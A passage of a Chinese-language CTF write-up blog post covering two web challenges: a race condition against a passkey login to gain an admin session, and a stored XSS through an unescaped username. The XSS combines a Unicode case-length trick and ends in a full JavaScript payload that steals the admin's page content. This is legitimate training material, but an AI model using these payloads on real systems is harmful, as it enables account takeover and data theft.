class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;credential is not registered for this username&quot;</span>&#125;), 400<br><br>        try:<br>            verification = verify_authentication_response(<br>                <span class="hljs-attribute">credential</span>=parsed_credential,<br>                <span class="hljs-attribute">expected_challenge</span>=b64url_decode(state[<span class="hljs-string">&quot;challenge&quot;</span>]),<br>                <span class="hljs-attribute">expected_rp_id</span>=get_rp_id(),<br>                <span class="hljs-attribute">expected_origin</span>=get_origin(),<br>                <span class="hljs-attribute">credential_public_key</span>=b64url_decode(expected_credential.public_key),<br>                <span class="hljs-attribute">credential_current_sign_count</span>=expected_credential.sign_count,<br>                <span class="hljs-attribute">require_user_verification</span>=<span class="hljs-literal">False</span>,<br>            )<br>        except Exception as exc:<br>            return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: f<span class="hljs-string">&quot;authentication failed: &#123;exc&#125;&quot;</span>&#125;), 400<br><br>        update_credential_sign_count(expected_credential.credential_id, verification.new_sign_count)<br><br>        state[<span class="hljs-string">&quot;verification_complete&quot;</span>] = <span class="hljs-literal">True</span><br>        state[<span class="hljs-string">&quot;verified_credential_id&quot;</span>] = expected_credential.credential_id<br>        redis_client.setex(challenge_key_for_session(), CHALLENGE_TTL_SECONDS, json.dumps(state))<br><br><br>    log = Logger(<span class="hljs-string">&quot;app.log&quot;</span>)<br>    log.log(f<span class="hljs-string">&quot;User &#123;state[&#x27;username&#x27;]&#125; authenticated with credential &#123;presented_credential_id&#125;&quot;</span>)<br>    redis_client.delete(challenge_key_for_session())<br><br>    final_credential = get_credential_by_id(presented_credential_id)<br>    <span class="hljs-keyword">if</span> final_credential is None:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;unknown credential id&quot;</span>&#125;), 400<br><br>    final_user = get_user_by_id(final_credential.user_id)<br>    <span class="hljs-keyword">if</span> final_user is None:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;credential owner disappeared&quot;</span>&#125;), 400<br><br>    session[<span class="hljs-string">&quot;user_id&quot;</span>] = final_user.id<br>    return jsonify(<br>        &#123;<br>            <span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">True</span>,<br>            <span class="hljs-string">&quot;redirect&quot;</span>: url_for(<span class="hljs-string">&quot;dashboard&quot;</span>),<br>            <span class="hljs-string">&quot;user&quot;</span>: final_user.username,<br>            <span class="hljs-string">&quot;is_admin&quot;</span>: final_user.is_admin,<br>        &#125;<br>    )<br><br><br>@app.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;/dashboard&quot;</span>)<br>def dashboard():<br>   <span class="hljs-built_in"> user </span>= current_user()<br>    <span class="hljs-keyword">if</span><span class="hljs-built_in"> user </span>is None:<br>        return redirect(url_for(<span class="hljs-string">&quot;login_page&quot;</span>))<br><br>    credentials = [<br>        &#123;<br>            <span class="hljs-string">&quot;hash&quot;</span>: sha256_hex(credential.credential_id),<br>            <span class="hljs-string">&quot;sign_count&quot;</span>: credential.sign_count,<br>        &#125;<br>        <span class="hljs-keyword">for</span> credential <span class="hljs-keyword">in</span> list_credentials_for_user(user.id)<br>    ]<br>    return render_template(<br>        <span class="hljs-string">&quot;dashboard.html&quot;</span>,<br>        <span class="hljs-attribute">user</span>=user,<br>        <span class="hljs-attribute">credentials</span>=credentials,<br>        <span class="hljs-attribute">flag</span>=get_flag() <span class="hljs-keyword">if</span> user.is_admin <span class="hljs-keyword">else</span> None,<br>    )<br><br><br>@app.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;/logout&quot;</span>)<br>def logout():<br>    session.clear()<br>    return redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<br><br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.<span class="hljs-built_in">run</span>(<span class="hljs-attribute">host</span>=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-attribute">port</span>=8000, <span class="hljs-attribute">debug</span>=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>admin才能拿flag</p>
+<p>第一：login时伪造admin拿到session</p>
+<p>第二：注册一个is_admin&#x3D;True的账户</p>
+<p>先看看login是是怎么确认身份的</p>
+<p>begin不确认身份，却泄露了一点任意用户的信息，可能可以用来伪造身份</p>
+<p>finish确定身份，需要一个id</p>
+<p>先看下admin的begin，后面应该（肯定）会用到</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/login/begin</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>bxs-archive-0hg23pn4jcbzxygy7nqmn.minori.node.bxs.team:83<br><br><span class="language-pgsql">&#123;&quot;username&quot;: &quot;admin&quot;&#125;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> OK</span><br><span class="language-pgsql"><span class="hljs-keyword">Server</span>: nginx/<span class="hljs-number">1.24</span><span class="hljs-number">.0</span> (Ubuntu)</span><br><span class="language-pgsql"><span class="hljs-type">Date</span>: Wed, <span class="hljs-number">11</span> Mar <span class="hljs-number">2026</span> <span class="hljs-number">05</span>:<span class="hljs-number">57</span>:<span class="hljs-number">24</span> GMT</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: application/<span class="hljs-type">json</span></span><br><span class="language-pgsql"><span class="hljs-keyword">Connection</span>: keep-alive</span><br><span class="language-pgsql"><span class="hljs-keyword">Set</span>-Cookie: tkp_session=eyJzaWQiOiJkYTI1ZDllYTQ5ZDY0YjlmYWJiMzY3MTM1MDY5NmYxNCJ9.abEERA.q0WVLXXwHG9vglpdkUhKs_vKmLY; HttpOnly; <span class="hljs-type">Path</span>=/; SameSite=Lax</span><br><span class="language-pgsql">Vary: Cookie</span><br><span class="language-pgsql">Content-Length: <span class="hljs-number">308</span></span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&#123;&quot;allowCredentials&quot;:[&#123;&quot;id&quot;:&quot;A_XxMilPYsZ2b3vi2tllSPl-3glWQD4OIpEJfAvhLsI&quot;,&quot;type&quot;:&quot;public-key&quot;&#125;],&quot;challenge&quot;:&quot;q_UaL5NNq4u0O2EwJbY51mSvcYk_DotltVmdEZukikxO9trNv4VLEdPetAaD3I3WtXBEW7V-eAmVvVcHOflDUA&quot;,&quot;rpId&quot;:&quot;bxs-archive-0hg23pn4jcbzxygy7nqmn.minori.node.bxs.team&quot;,&quot;timeout&quot;:<span class="hljs-number">60000</span>,&quot;userVerification&quot;:&quot;preferred&quot;&#125;</span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
+
+<p>公钥登录</p>
+<p>先注册一个aaa</p>
+<p>登录时，最后用id来验证身份</p>
+<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-keyword">final</span><span class="hljs-number">_</span>credential = get<span class="hljs-number">_</span>credential<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>id(presented<span class="hljs-number">_</span>credential<span class="hljs-number">_</span>id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">final</span><span class="hljs-number">_</span>credential <span class="hljs-keyword">is</span> None:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: False, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;unknown credential id&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-keyword">final</span><span class="hljs-number">_u</span>ser = get<span class="hljs-number">_u</span>ser<span class="hljs-number">_</span><span class="hljs-meta">by</span><span class="hljs-number">_</span>id(<span class="hljs-keyword">final</span><span class="hljs-number">_</span>credential.user<span class="hljs-number">_</span>id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">final</span><span class="hljs-number">_u</span>ser <span class="hljs-keyword">is</span> None:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: False, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;credential owner disappeared&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    session[<span class="hljs-string">&quot;user_id&quot;</span>] = <span class="hljs-keyword">final</span><span class="hljs-number">_u</span>ser.id<br>    <span class="hljs-keyword">return</span> jsonify(<br>        &#123;<br>            <span class="hljs-string">&quot;ok&quot;</span>: True,<br>            <span class="hljs-string">&quot;redirect&quot;</span>: url<span class="hljs-number">_f</span>or(<span class="hljs-string">&quot;dashboard&quot;</span>),<br>            <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-keyword">final</span><span class="hljs-number">_u</span>ser.username,<br>            <span class="hljs-string">&quot;is_admin&quot;</span>: <span class="hljs-keyword">final</span><span class="hljs-number">_u</span>ser.<span class="hljs-keyword">is</span><span class="hljs-number">_</span>admin,<br>        &#125;<br>    )<br></code></pre></td></tr></table></figure>
+
+<p>但是要verification_complete为True绕过</p>
+<p>这个值在redis里取的，尝试条件竞争</p>
+<p>抓包去发</p>
+<p><img src="/2026/03/11/SparkCTF-Web/image-20260311151354332.png" srcset="/img/loading.gif" lazyload alt="image-20260311151354332"></p>
+<p>用这个cookie访问flag界面即可</p>
+<h2 id="Slay-the-Deadline"><a href="#Slay-the-Deadline" class="headerlink" title="Slay the Deadline"></a>Slay the Deadline</h2><p>一眼xss</p>
+<p>阻碍：</p>
+<ol>
+<li>flag藏起来了</li>
+<li>title与content写入都实体编码了</li>
+</ol>
+<p>基本打不了，找其他能xss的地方</p>
+<p>发现view界面有用户名</p>
+<p>尝试用户名注册成js代码，但是jinja2模板输出转义了</p>
+<p>看了下view.html</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">&#123;% extends &quot;layout.html&quot; %&#125;</span><br><span class="language-xml">&#123;% block content %&#125;</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">title</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><br><span class="language-xml">    </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">content</span> | safe &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>作者: </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">todo.owner</span> &#125;&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;actions&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span>回到主页<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">url_for</span>(<span class="hljs-name">&#x27;share&#x27;</span>, <span class="hljs-attr">todo_id</span>=todo.id) &#125;&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;display: inline;&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>分享给管理员<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">&#123;% endblock %&#125;</span><br><span class="language-xml"></span><br></code></pre></td></tr></table></figure>
+
+<p> content | safe 直接输出了，应该是在这xss</p>
+<p>但是写入有编码，只能构造标签逃逸</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">def add_todo(user, title: str, content: str):  </span><br><span class="language-xml">    safe_title = html.escape(title)</span><br><span class="language-xml">    safe_content = html.escape(content)</span><br><span class="language-xml"></span><br><span class="language-xml">    metadata = f&quot;<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><span class="hljs-template-variable">&#123;safe_title&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">TODO</span>&gt;</span></span><span class="hljs-template-variable">&#123;safe_content&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">TODO</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span></span><span class="hljs-template-variable">&#123;user[&#x27;username&#x27;]&#125;</span><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span>&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>发现add时username可控又不编码，只需js代码之后</TODO>即可</p>
+<p>构造用户名为</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(11)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">TODO</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>查看view时成功执行</p>
+<p>接下来就是flag藏起来的问题，想办法逃逸flag</p>
+<p>先看更新逻辑</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/edit/&lt;int:todo_id&gt;&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">todo_id</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        title = request.form[<span class="hljs-string">&quot;title&quot;</span>]<br>        content = request.form[<span class="hljs-string">&quot;content&quot;</span>]<br>        user = &#123;<span class="hljs-string">&quot;username&quot;</span>: session[<span class="hljs-string">&quot;username&quot;</span>]&#125;<br>        db.update_todo(user, todo_id, title, content)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;index&quot;</span>))<br><br>    todo = db.get_todo(todo_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> todo <span class="hljs-keyword">or</span> todo[<span class="hljs-string">&quot;owner&quot;</span>] != session[<span class="hljs-string">&quot;username&quot;</span>]:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Not found or denied&quot;</span>, <span class="hljs-number">403</span><br>        <br>    raw = todo[<span class="hljs-string">&quot;metadata&quot;</span>]<br>    title = utils.get_tag_content(raw, <span class="hljs-string">&quot;title&quot;</span>)<br>    content = utils.get_tag_content(raw, <span class="hljs-string">&quot;TODO&quot;</span>)<br>    <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;edit.html&quot;</span>, todo=todo, title=title, content=content)<br>    <br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_todo</span>(<span class="hljs-params">user, todo_id, title, content</span>):<br>    todo = get_todo(todo_id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> todo:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Todo not found&quot;</span>&#125;<br><br>    <span class="hljs-keyword">if</span> todo[<span class="hljs-string">&quot;owner&quot;</span>] != user[<span class="hljs-string">&quot;username&quot;</span>]:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Permission denied&quot;</span>&#125;<br>    current_raw = todo[<span class="hljs-string">&quot;metadata&quot;</span>]<br>    end_marker = <span class="hljs-string">&quot;&lt;/TODO&gt;&quot;</span><br>    split_index = current_raw.rfind(end_marker)<br><br>    <span class="hljs-keyword">if</span> split_index != -<span class="hljs-number">1</span>:<br>        suffix = current_raw[split_index + <span class="hljs-built_in">len</span>(end_marker):]<br>    <span class="hljs-keyword">else</span>:<br>        suffix = <span class="hljs-string">&quot;&quot;</span><br><br>    safe_title = html.escape(title)<br>    safe_content = html.escape(content)<br>    new_raw = <span class="hljs-string">f&quot;&lt;title&gt;<span class="hljs-subst">&#123;safe_title&#125;</span>&lt;/title&gt;&lt;TODO&gt;<span class="hljs-subst">&#123;safe_content&#125;</span>&lt;/TODO&gt;<span class="hljs-subst">&#123;suffix&#125;</span>&quot;</span><br>    todo[<span class="hljs-string">&quot;metadata&quot;</span>] = new_raw<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;success&quot;</span>: <span class="hljs-literal">True</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>update_todo基本搞不了</p>
+<p>utils.get_tag_content时</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs arcade">def get_tag_content(<span class="hljs-built_in">text</span>, tag_name):<br>    <span class="hljs-keyword">if</span> not <span class="hljs-built_in">text</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    tag_upper = tag_name.<span class="hljs-built_in">upper</span>()<br>    start_tag = f<span class="hljs-string">&quot;&lt;&#123;tag_upper&#125;&gt;&quot;</span><br>    end_tag = f<span class="hljs-string">&quot;&lt;/&#123;tag_upper&#125;&gt;&quot;</span><br>    upper_text = <span class="hljs-built_in">text</span>.<span class="hljs-built_in">upper</span>()<br>    start_idx = upper_text.<span class="hljs-built_in">find</span>(start_tag)<br>    <span class="hljs-keyword">if</span> start_idx == <span class="hljs-number">-1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    end_idx = upper_text.rfind(end_tag)<br>    <span class="hljs-keyword">if</span> end_idx == <span class="hljs-number">-1</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">text</span>[start_idx + len(start_tag): end_idx]<br></code></pre></td></tr></table></figure>
+
+<p>某些特殊字符upper()时长度会变，这里只用找个变长的放到content里，返回text时会把flag带出来</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">for i in range(<span class="hljs-number">0</span>xffff):<br>    if len(chr(i).upper())&gt;<span class="hljs-number">1</span>:<br>        print(len(chr(i)),end=&#x27;&#x27;)<br>        print(chr(i), end=&#x27;&#x27;)<br>        print(len(chr(i).upper()),end=&#x27; &#x27;)<br>        <br>//<span class="hljs-number">1ß2 1ŉ2</span> <span class="hljs-number">1ǰ2 1ΐ3</span> <span class="hljs-number">1ΰ3 1և2</span> <span class="hljs-number">1ẖ2 1ẗ2</span> <span class="hljs-number">1ẘ2 1ẙ2</span> <span class="hljs-number">1ẚ2 1ὐ2</span> <span class="hljs-number">1ὒ3 1ὔ3</span> <span class="hljs-number">1ὖ3 1ᾀ2</span> <span class="hljs-number">1ᾁ2 1ᾂ2</span> <span class="hljs-number">1ᾃ2 1ᾄ2</span> <span class="hljs-number">1ᾅ2 1ᾆ2</span> <span class="hljs-number">1ᾇ2 1ᾈ2</span> <span class="hljs-number">1ᾉ2 1ᾊ2</span> <span class="hljs-number">1ᾋ2 1ᾌ2</span> <span class="hljs-number">1ᾍ2 1ᾎ2</span> <span class="hljs-number">1ᾏ2 1ᾐ2</span> <span class="hljs-number">1ᾑ2 1ᾒ2</span> <span class="hljs-number">1ᾓ2 1ᾔ2</span> <span class="hljs-number">1ᾕ2 1ᾖ2</span> <span class="hljs-number">1ᾗ2 1ᾘ2</span> <span class="hljs-number">1ᾙ2 1ᾚ2</span> <span class="hljs-number">1ᾛ2 1ᾜ2</span> <span class="hljs-number">1ᾝ2 1ᾞ2</span> <span class="hljs-number">1ᾟ2 1ᾠ2</span> <span class="hljs-number">1ᾡ2 1ᾢ2</span> <span class="hljs-number">1ᾣ2 1ᾤ2</span> <span class="hljs-number">1ᾥ2 1ᾦ2</span> <span class="hljs-number">1ᾧ2 1ᾨ2</span> <span class="hljs-number">1ᾩ2 1ᾪ2</span> <span class="hljs-number">1ᾫ2 1ᾬ2</span> <span class="hljs-number">1ᾭ2 1ᾮ2</span> <span class="hljs-number">1ᾯ2 1ᾲ2</span> <span class="hljs-number">1ᾳ2 1ᾴ2</span> <span class="hljs-number">1ᾶ2 1ᾷ3</span> <span class="hljs-number">1ᾼ2 1ῂ2</span> <span class="hljs-number">1ῃ2 1ῄ2</span> <span class="hljs-number">1ῆ2 1ῇ3</span> <span class="hljs-number">1ῌ2 1ῒ3</span> <span class="hljs-number">1ΐ3 1ῖ2</span> <span class="hljs-number">1ῗ3 1ῢ3</span> <span class="hljs-number">1ΰ3 1ῤ2</span> <span class="hljs-number">1ῦ2 1ῧ3</span> <span class="hljs-number">1ῲ2 1ῳ2</span> <span class="hljs-number">1ῴ2 1ῶ2</span> <span class="hljs-number">1ῷ3 1ῼ2</span> <span class="hljs-number">1ﬀ2 1ﬁ2</span> <span class="hljs-number">1ﬂ2 1ﬃ3</span> <span class="hljs-number">1ﬄ3 1ﬅ2</span> <span class="hljs-number">1ﬆ2 1ﬓ2</span> <span class="hljs-number">1ﬔ2 1ﬕ2</span> <span class="hljs-number">1ﬖ2 1ﬗ2</span> <br></code></pre></td></tr></table></figure>
+
+<p>现在构造xss payload就好</p>
+<p>session 的httponly是开的，所以尝试把flag写到一个用户的view</p>
+<p>这里试了半天，cookie直接传不了，可以login一个用户（cookie就会变）但是界面不刷新是不变的</p>
+<p>注册登录用户名</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;script&gt;(async () =&gt; &#123;await fetch(<span class="hljs-string">&quot;/edit/1&quot;</span>,&#123;<span class="hljs-function"><span class="hljs-keyword">method</span>: &quot;<span class="hljs-title">POST</span>&quot;,<span class="hljs-title">headers</span>: </span>&#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,&#125;,body:new URLSearchParams(&#123;<br>      title: <span class="hljs-string">&#x27;aaa&#x27;</span>,<br>      content: <span class="hljs-string">&#x27;ß&#x27;</span>.repeat(<span class="hljs-number">80</span>)<br>    &#125;)&#125;);const f = await fetch(<span class="hljs-string">&#x27;/view/1&#x27;</span>).then(<span class="hljs-string">r =&gt;</span> r.text());await fetch(<span class="hljs-string">&#x27;/login&#x27;</span>, &#123;<br>      <span class="hljs-function"><span class="hljs-keyword">method</span>: &#x27;<span class="hljs-title">POST</span>&#x27;,</span><br><span class="hljs-function">      <span class="hljs-title">headers</span>: </span>&#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,<br>      &#125;,<br>      body: <span class="hljs-string">&#x27;username=aaa&amp;password=aaa&#x27;</span>,<br>      credentials: <span class="hljs-string">&#x27;include&#x27;</span>&#125;);await fetch(<span class="hljs-string">&#x27;/create&#x27;</span>,&#123;<span class="hljs-function"><span class="hljs-keyword">method</span>: &quot;<span class="hljs-title">POST</span>&quot;,<span class="hljs-title">credentials</span>: &#x27;<span class="hljs-title">include</span>&#x27;,<span class="hljs-title">headers</span>:</span>&#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded&#x27;</span>,&#125;,body: <span class="hljs-string">&quot;title=addda&amp;content=&quot;</span> + encodeURIComponent(f)&#125;)&#125;)();&lt;<span class="hljs-regexp">/script&gt;&lt;/</span>TODO&gt;<br></code></pre></td></tr></table></figure>
+
+<p>随便创建一个todo，然后share对应编号即可</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf/" class="category-chain-item">ctf</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>SparkCTF-Web</div>
+      <div>https://www.xiaotian.org.cn/2026/03/11/SparkCTF-Web/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xiaotian</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月11日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
